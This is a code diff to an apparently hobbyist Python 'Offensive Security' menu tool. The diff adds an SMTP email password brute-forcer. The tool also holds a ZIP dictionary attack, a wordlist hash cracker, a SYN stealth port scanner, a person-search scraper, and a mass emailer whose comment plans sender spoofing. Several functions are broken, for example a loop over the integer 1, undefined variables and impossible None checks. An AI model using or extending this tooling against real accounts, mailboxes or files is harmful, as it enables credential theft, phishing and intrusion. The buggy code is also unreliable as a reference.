@@ -47,52 +47,63 @@ def OffsecHelpmenu():
 
 #command line menu
 def OffsecMenu():
-    print()
-    print("Welcome to the world of Offensive Security:")
-    print("1. Social Engineering")#Done until more features to be added
-    print("2. Dictionary Creation")#Donr
-    print("3. Bruteforcing tool")#TODO Add email bruteforcing
-    print("4. Reverse shell")#Done
-    print("5. Hash cracking")#Done
-    print("88. Help")
-    print("99. Exit")
-    x = int(input("What option would you like to choose? "))
-    if(x == 1):
-        SocialEngineering()
-    elif(x == 2):
-        Dictionary()
-    elif(x == 3):
-        Brute()
-    elif(x == 4):
-        Reverse_Shell()
-    elif(x == 5):
-        HashCrack()
-    elif(x == 88):
-        OffsecHelpmenu()
-        OffsecMenu()
-    elif(x == 99):
-        exit()
+    try:
+        print()
+        print("Welcome to the world of Offensive Security:")
+        print("1. Social Engineering")#Done until more features to be added
+        print("2. Dictionary Creation")#Donr
+        print("3. Bruteforcing tool")#TODO Add email bruteforcing
+        print("4. Reverse shell")#Done
+        print("5. Hash cracking")#Done
+        print("88. Help")
+        print("99. Exit")
+        x = int(input("What option would you like to choose? "))
+        if(x == 1):
+            SocialEngineering()
+        elif(x == 2):
+            Dictionary()
+        elif(x == 3):
+            Brute()
+        elif(x == 4):
+            Reverse_Shell()
+        elif(x == 5):
+            HashCrack()
+        elif(x == 88):
+            OffsecHelpmenu()
+            OffsecMenu()
+        elif(x == 99):
+            sys.exit(0)
+    except KeyboardInterrupt:
+        sys.exit(1)
 #IP geolocation
 def geolocation():
-    ip = input("Enter the IP you want to search for: ")
-    r = requests.get("https://www.ipinfo.io/"+ip+"/geo")
-    ret = r.text
-    parsed = json.loads(ret)
-    print()
-    print("Here are the results")
-    print("City: "+parsed["city"])
-    print("Region: "+parsed["region"])
-    print("Country: "+parsed["country"])
+    try:
+        ip = input("Enter the IP you want to search for: ")
+        r = requests.get("https://www.ipinfo.io/"+ip+"/geo")
+        ret = r.text
+        parsed = json.loads(ret)
+        print()
+        print("Here are the results")
+        print("City: "+parsed["city"])
+        print("Region: "+parsed["region"])
+        print("Country: "+parsed["country"])
+    except KeyboardInterrupt:
+        print("Forced exit...")
+        sys.exit(1)
 
 #Input a name and it will scrape all available info from google on the person and print it
 
 def persona():
-    person = input("Enter the person you want to search (use + instead of spaces): ")
-    url = "https://www.google.com/search?q=" + person
-    response = requests.get(url)
-    soup = BeautifulSoup(response.content,"html.parser")
-    for link in soup.find_all('span',attrs={'class':'st'}):
-        print(link.text)
+    try:
+        person = input("Enter the person you want to search (use + instead of spaces): ")
+        url = "https://duckduckgo.com/?q=" + person
+        response = requests.get(url)
+        soup = BeautifulSoup(response.content,"html.parser")
+        for link in soup.find_all('div',attrs={'class':'result__snippet'}):
+            print(link.text)
+    except KeyboardInterrupt:
+        print("Forced exit...")
+        sys.exit(1)
 
 def hostIP():
     host = input("Enter a host: ")
@@ -106,39 +117,46 @@ def runScan(port ,ip):
         if result == 0:
             print("Open port at %i"%port)
         else:
-            print("The result was %i at port %i" %(result, port))
+            print("Closed port at %i" %port)
     except KeyboardInterrupt:
         print("Forced exit...")
+        sys.exit(1)
     except socket.error:
         print("Could not connect")
+        sys.exit(1)
 
 def scanPort(port,target):
     try:
-        srPort = RandShort()
+        oof = RandShort()
         conf.verb = 0
-        SynACKPacket = sr1(IP(dst=target)/TCP(sport = srPort,dport = port,flags="S"))
-        pFlags = SynACKPacket.getlayer(TCP).flags
-        if pFlags == 0x12:
-            return True
-        else:
+        SynACKPacket = sr1(IP(dst=target)/TCP(sport = oof,dport = port,flags="S"))
+        print(type(SynACKPacket))
+        if type(SynACKPacket) is None:
+            print("Port is closed")
             return False
-        RSTPacket = IP(dst=target)/TCP(sport = srPort, dport = port, flags="R")
-        send(RSTPacket)
+        else:
+            pFlags = SynACKPacket.getlayer(TCP).flags
+            if pFlags == 0x12:
+                return True
+            else:
+                return False
+            RSTPacket = IP(dst=target)/TCP(sport = oof, dport = port, flags="R")
+            send(RSTPacket)
     except KeyboardInterrupt:
         print("Forced exit...")
         print()
-        OffsecMenu()
+        sys.exit(1)
 
 
 def checkHost(ip):
-    conf.verb = 0
+    conf.verb = 1
     try:
         ping = sr1(IP(dst = ip)/ICMP())
         print("Target is resolved")
     except Exception:
         print("Host cannot be resolved")
         print()
-        runStealthScan()
+        OffsecMenu()
 
 def runStealthScan():
     try:
@@ -172,162 +190,220 @@ def runStealthScan():
     stop_clock = datetime.now()
     tTime = stop_clock-start_clock
     print("Time elapsed: "+str(tTime))
+    sys.exit(1)
 
 
 def portScan():
-    stealth = input("Do you want to use stealth scan? [Y/N]: ")
-    if stealth == "Y":
-        runStealthScan()
-    elif stealth != "Y" or "N":
-        print("Wrong input")
-        print()
-        portScan()
-    host = input("Enter the host IP: ")
-    print("Enter the range of ports you want to scan on the host")
-    start = int(input("Starting port: "))
-    end = int(input("Ending port: "))
-    for i in range(start,end):
-        runScan(i,host)
+    try:
+        stealth = input("Do you want to use stealth scan? [Y/N]: ")
+        if stealth == "Y":
+            runStealthScan()
+        elif stealth != "N":
+            print("Wrong input")
+            print()
+            portScan()
+        host = input("Enter the host IP: ")
+        print("Enter the range of ports you want to scan on the host")
+        start = int(input("Starting port: "))
+        end = int(input("Ending port: "))
+        for i in range(start,end):
+            runScan(i,host)
+    except KeyboardInterrupt:
+        print("Forced exit...")
+        sys.exit(1)
 
 
 
 #social engienrring sub menu
 def SocialEngineering():
-    print("Welcome to the Social Engineering area of MSF")
-    print("1. Mass emailer")
-    print("2. IP Geolocation")
-    print("3. Persona Searcher")
-    print("4. Host IP grabber")
-    print("5. Port Scanner")
+    try:
+        print("Welcome to the Social Engineering area of MSF")
+        print("1. Mass emailer")
+        print("2. IP Geolocation")
+        print("3. Persona Searcher")
+        print("4. Host IP grabber")
+        print("5. Port Scanner")
+        print("99. Back")
 
-    x = int(input("Enter the number of your option: "))
-    if(x == 1):
-        MassEmailer()
-    elif(x == 2):
-        geolocation()
-    elif(x == 3):
-        persona()
-    elif(x==4):
-        hostIP()
-    elif(x==5):
-        portScan()
-    else:
-        print("Not an option")
-        SocialEngineering()
+        x = int(input("Enter the number of your option: "))
+        if(x == 1):
+            MassEmailer()
+        elif(x == 2):
+            geolocation()
+        elif(x == 3):
+            persona()
+        elif(x==4):
+            hostIP()
+        elif(x==5):
+            portScan()
+        elif(x==99):
+            OffsecMenu()
+        else:
+            print("Not an option")
+            SocialEngineering()
+    except KeyboardInterrupt:
+        print("Forced Exit...")
+        sys.exit(1)
+
 #Outline for a mass emailer. Will add sender spoofing
 def MassEmailer():
-    list = input("Enter the filename for the email list")
-    with open(list) as f:
-        lines = [line.rstrip('\n') for line in open(list)]
-    for i in lines:
-        arr1.append(i)
-    sender = input("Enter the sender address: ")
-    provider = input("Enter the provider here: ")
-    subject = input("Enter the subject of the email: ")
-    prov_port = int(input("Enter the smtp port number for your provider: "))
-    password = getpass.getpass()
-    s = smtplib.SMTP(host=provider, port=prov_port)
-    s.starttls()
     try:
-        s.login(sender,password)
-    except smtplib.SMTPException:
-        print("Something went wrong....")
-        time.sleep(1)
-        MassEmailer()
-    #message creation
-    message = input("Enter the message body: ")
-    for email in 1:
-        msg = MIMEMultipart()
-        msg['From']=sender
-        msg['To']=to
-        msg['Subject']=subject
+        list = input("Enter the filename for the email list")
+        with open(list) as f:
+            lines = [line.rstrip('\n') for line in open(list)]
+        for i in lines:
+            arr1.append(i)
+        sender = input("Enter the sender address: ")
+        provider = input("Enter the provider here: ")
+        subject = input("Enter the subject of the email: ")
+        prov_port = int(input("Enter the smtp port number for your provider: "))
+        password = getpass.getpass()
+        s = smtplib.SMTP(host=provider, port=prov_port)
+        s.starttls()
+        try:
+            s.login(sender,password)
+        except smtplib.SMTPException:
+            print("Something went wrong....")
+            time.sleep(1)
+            MassEmailer()
+        #message creation
+        message = input("Enter the message body: ")
+        for email in 1:
+            msg = MIMEMultipart()
+            msg['From']=sender
+            msg['To']=to
+            msg['Subject']=subject
 
-    # add in the message body
-        msg.attach(MIMEText(message, 'plain'))
+        # add in the message body
+            msg.attach(MIMEText(message, 'plain'))
 
-    # send the message via the server set up earlier.
-        s.send_message(msg)
-        del msg
-    s.quit()
+        # send the message via the server set up earlier.
+            s.send_message(msg)
+            del msg
+        s.quit()
+    except KeyboardInterrupt:
+        print("Forced exit...")
+        sys.exit(0)
 
 
 def Dictionary():
-    print("You chose the dictionary creation tool. With this tool, you can create a password dictionary with just a few base words")
-    while True:
-        try:
-            list = input("Input your list name (has to be in the same directory as this): ")
-            with open(list) as f:
-                x = [line.rstrip('\n') for line in open(list)]
-            break
-        except OSError:
-            print("This file cannot be opened")
-    print()
-    idx = int(input("How many words would you want combined?(max 4): "))
-    while(idx > 4 or idx < 1 ):
+    try:
+        print("You chose the dictionary creation tool. With this tool, you can create a password dictionary with just a few base words")
+        while True:
+            try:
+                list = input("Input your list name (has to be in the same directory as this): ")
+                with open(list) as f:
+                    x = [line.rstrip('\n') for line in open(list)]
+                break
+            except OSError:
+                print("This file cannot be opened")
+        print()
         idx = int(input("How many words would you want combined?(max 4): "))
-    dictExec(list,idx)
+        while(idx > 4 or idx < 1 ):
+            idx = int(input("How many words would you want combined?(max 4): "))
+        dictExec(list,idx)
+    except KeyboardInterrupt:
+        print("Forced exit...")
+        sys.exit(1)
 #Creates a password dictionary based off of wordlist with variable passsword depth
 def dictExec(list,idx):
-    x = 0
-    with open(list) as f:
-        lines = [line.rstrip('\n') for line in open(list)]
-    for i in lines:
-        print(str(x)+": "+i)
-        arr1.append(i)
-        x+=1
-    print()
-    print("Post value listing")
-    print()
-    y = 0
-    if(idx == 2):
-        for y in range(len(arr1)):
-            for i in range(len(arr1)):
-                print(arr1[y] + arr1[i])
-    elif(idx == 3):
-        for y in range(len(arr1)):
-            for i in range(len(arr1)):
-                for x in range(len(arr1)):
-                    print(arr1[y]+arr1[i]+arr1[x])
-    elif(idx == 4):
-        for y in range(len(arr1)):
-            for i in range(len(arr1)):
-                for x in range(len(arr1)):
-                    for z in range(len(arr1)):
-                        print(arr1[y]+arr1[i]+arr1[x]+arr1[z])
+    try:
+        x = 0
+        with open(list) as f:
+            lines = [line.rstrip('\n') for line in open(list)]
+        for i in lines:
+            print(str(x)+": "+i)
+            arr1.append(i)
+            x+=1
+        print()
+        print("Post value listing")
+        print()
+        y = 0
+        if(idx == 2):
+            for y in range(len(arr1)):
+                for i in range(len(arr1)):
+                    print(arr1[y] + arr1[i])
+        elif(idx == 3):
+            for y in range(len(arr1)):
+                for i in range(len(arr1)):
+                    for x in range(len(arr1)):
+                        print(arr1[y]+arr1[i]+arr1[x])
+        elif(idx == 4):
+            for y in range(len(arr1)):
+                for i in range(len(arr1)):
+                    for x in range(len(arr1)):
+                        for z in range(len(arr1)):
+                            print(arr1[y]+arr1[i]+arr1[x]+arr1[z])
+    except KeyboardInterrupt:
+        print("Forced exit...")
+        sys.exit(1)
 
 
 def Brute():
-    print("Welcome to the Bruteforce menu")
-    print()
-    print("1. Email bruteforce")
-    print("2. ZIP bruteforce")
-    x = int(input("Enter the number of your choice: "))
-    if(x == 1):
-        bfEmail()
-    if(x == 2):
-        bfZip()
+    try:
+        print("Welcome to the Bruteforce menu")
+        print()
+        print("1. Email bruteforce")
+        print("2. ZIP bruteforce")
+        print("99. Back")
+        x = int(input("Enter the number of your choice: "))
+        if(x == 1):
+            bfEmail()
+        elif(x == 2):
+            bfZip()
+        elif(x==99):
+            OffsecMenu()
+        else:
+            print("Bad input")
+            print()
+            Brute()
+    except KeyboardInterrupt:
+        print("Forced exit...")
+        sys.exit(1)
 #email brutefocing, will use proxies to bypass captchas (?)
 def bfEmail():
-    print()
-
+    try:
+        list = input("Enter the filename for the email list")
+        with open(list) as f:
+            lines = [line.rstrip('\n') for line in open(list)]
+        for i in lines:
+            arr1.append(i)
+        username = input("Enter the email: ")
+        pw = getpass.getpass()
+        provider = input("Enter the provider: ")
+        p = int(input("Enter the port number: "))
+        s = smtplib.SMTP(host=provider,port = p)
+        s.starttls()
+        for i in arr1:
+            try:
+                s.login(username,arr1[i])
+                print("Password is: %s"%arr[i])
+            except smtplib.SMTPException:
+                print("Something went wrong...")
+    except KeyboardInterrupt:
+        print("Forced exit...")
+        sys.exit(1)
 
 #Dictionary attack to break .zip file passwords
 def bfZip():
-    pass_ay = []
-    print("zip and dictionary file have to be in the same directory as this")
-    zip = input("Enter the name of your zip file: ")
-    dict = input("Enter the name of your dictionary: ")
-    with zipfile.ZipFile(zip, 'r') as zf:
-        print(zf.namelist())
-        for filename in zf.namelist():
-            with open(dict) as f:
-                x = [line.rstrip('\n') for line in open(dict)]
-            for pw in x:
-                try:
-                    zf.extractall(pwd=bytes(pw,'utf-8'))
-                    print("Password found: "+pw)
-                except:
-                    print("Wrong password: "+pw)
+    try:
+        print("zip and dictionary file have to be in the same directory as this")
+        zip = input("Enter the name of your zip file: ")
+        dict = input("Enter the name of your dictionary: ")
+        with zipfile.ZipFile(zip, 'r') as zf:
+            print(zf.namelist())
+            for filename in zf.namelist():
+                with open(dict) as f:
+                    x = [line.rstrip('\n') for line in open(dict)]
+                for pw in x:
+                    try:
+                        zf.extractall(pwd=bytes(pw,'utf-8'))
+                        print("Password found: "+pw)
+                    except:
+                        print("Wrong password: "+pw)
+    except KeyboardInterrupt:
+        print("Forced exit...")
+        sys.exit(1)
 
 #reverse shell Creation
 
@@ -383,95 +459,106 @@ def Reverse_Shell():
 
 #Inner menu for the hash cracker
 def HashCrack():
-    print("You chose the hash cracking tool. With this tool, you'll be able to reverse check hashes in order to crack hashed passwords")
-    list = input("Input your list name (has to be in the same directory as this): ")
-    hash = input("Enter the hash you want cracked: ")
-    print()
-    print("Available Algorithms:")
-    print("1. md5")
-    print("2. sha1")
-    print("3. sha256")
-    print("4. sha224")
-    print("5. sha384")
-    print("6. sha512")
-    algorithm = int(input("Enter the number of the correct hashing algorithm: "))
-    if(algorithm < 1 or algorithm > 6):
-        print("Not a valid option")
+    try:
+        print("You chose the hash cracking tool. With this tool, you'll be able to reverse check hashes in order to crack hashed passwords")
+        list = input("Input your list name (has to be in the same directory as this): ")
+        hash = input("Enter the hash you want cracked: ")
         print()
-        HashCrack()
-    crackExec(list,hash,algorithm)
+        print("Available Algorithms:")
+        print("1. md5")
+        print("2. sha1")
+        print("3. sha256")
+        print("4. sha224")
+        print("5. sha384")
+        print("6. sha512")
+        print("99. Back")
+        algorithm = int(input("Enter the number of the correct hashing algorithm: "))
+        if(algorithm == 99):
+            OffsecMenu()
+        elif(algorithm < 1 or algorithm > 6):
+            print("Not a valid option")
+            print()
+            HashCrack()
+        crackExec(list,hash,algorithm)
+    except KeyboardInterrupt:
+        print("Forced exit...")
+        sys.exit(1)
 
 #Hash cracking by comparing hash values from word lists. Effective against 1 way hashes like SHA2 and SHA3
 def crackExec(list,hash,algorithm):
-    sentinel = hash
-    with open(list) as f:
-        lines = [line.rstrip('\n') for line in open(list)]
-    for i in lines:
-        arr1.append(i)
-    if(algorithm == 1):
-        found = False
-        for i in range(len(arr1)):
-            m = hashlib.md5(arr1[i].encode())
-            if(m.hexdigest() == hash):
-                print("The hash was found.The password is: "+arr1[i])
-                found = True
-                break
-        if(not found):
-            print("No passwords matched")
+    try:
+        sentinel = hash
+        with open(list) as f:
+            lines = [line.rstrip('\n') for line in open(list)]
+        for i in lines:
+            arr1.append(i)
+        if(algorithm == 1):
+            found = False
+            for i in range(len(arr1)):
+                m = hashlib.md5(arr1[i].encode())
+                if(m.hexdigest() == hash):
+                    print("The hash was found.The password is: "+arr1[i])
+                    found = True
+                    break
+            if(not found):
+                print("No passwords matched")
 
-    elif(algorithm == 2):
-        found = False
-        for i in range(len(arr1)):
-            m = hashlib.sha1(arr1[i].encode())
-            if(m.hexdigest() == hash):
-                print("The hash was found.The password is: "+arr1[i])
-                found = True
-                break
-        if(not found):
-            print("No passwords matched")
-    elif(algorithm == 3):
-        found = False
-        for i in range(len(arr1)):
-            m = hashlib.sha256(arr[i].encode())
-            if(m.hexdigest() == hash):
-                print("The hash was found.The password is: "+arr1[i])
-                found = True
-                break
-        if(not found):
-            print("No passwords matched")
+        elif(algorithm == 2):
+            found = False
+            for i in range(len(arr1)):
+                m = hashlib.sha1(arr1[i].encode())
+                if(m.hexdigest() == hash):
+                    print("The hash was found.The password is: "+arr1[i])
+                    found = True
+                    break
+            if(not found):
+                print("No passwords matched")
+        elif(algorithm == 3):
+            found = False
+            for i in range(len(arr1)):
+                m = hashlib.sha256(arr[i].encode())
+                if(m.hexdigest() == hash):
+                    print("The hash was found.The password is: "+arr1[i])
+                    found = True
+                    break
+            if(not found):
+                print("No passwords matched")
 
-    elif(algorithm == 4):
-        found = False
-        for i in range(len(arr)):
-            m = hashlib.sha224(arr1[i].encode())
-            if(m.hexdigest() == hash):
-                print("The hash was found.The password is: "+arr1[i])
-                found = True
-                break
-        if(not found):
-            print("No passwords matched")
-    elif(algorithm == 5):
-        found = False
-        for i in range(len(arr1)):
-            m = hashlib.sha384(arr1[i].encode())
-            if(m.hexdigest() == hash):
-                print("The hash was found.The password is: "+arr1[i])
-                found = True
-                break
-        if(not found):
-            print("No passwords matched")
-    elif(algorithm == 6):
-        found = False
-        for i in range(len(arr1)):
-            m = hashlib.sha512(arr1[i].encode())
-            if(m.hexdigest() == hash):
-                print("The hash was found.The password is: "+arr1[i])
-                found = True
-                break
-        if(not found):
-            print("No passwords matched")
-    else:
-        print("Not a valid option")
-        HashCrack()
+        elif(algorithm == 4):
+            found = False
+            for i in range(len(arr)):
+                m = hashlib.sha224(arr1[i].encode())
+                if(m.hexdigest() == hash):
+                    print("The hash was found.The password is: "+arr1[i])
+                    found = True
+                    break
+            if(not found):
+                print("No passwords matched")
+        elif(algorithm == 5):
+            found = False
+            for i in range(len(arr1)):
+                m = hashlib.sha384(arr1[i].encode())
+                if(m.hexdigest() == hash):
+                    print("The hash was found.The password is: "+arr1[i])
+                    found = True
+                    break
+            if(not found):
+                print("No passwords matched")
+        elif(algorithm == 6):
+            found = False
+            for i in range(len(arr1)):
+                m = hashlib.sha512(arr1[i].encode())
+                if(m.hexdigest() == hash):
+                    print("The hash was found.The password is: "+arr1[i])
+                    found = True
+                    break
+            if(not found):
+                print("No passwords matched")
+        else:
+            print("Not a valid option")
+            HashCrack()
+    except KeyboardInterrupt:
+        print("Forced exit...")
+        sys.exit(1)
 
 OffsecMenu()
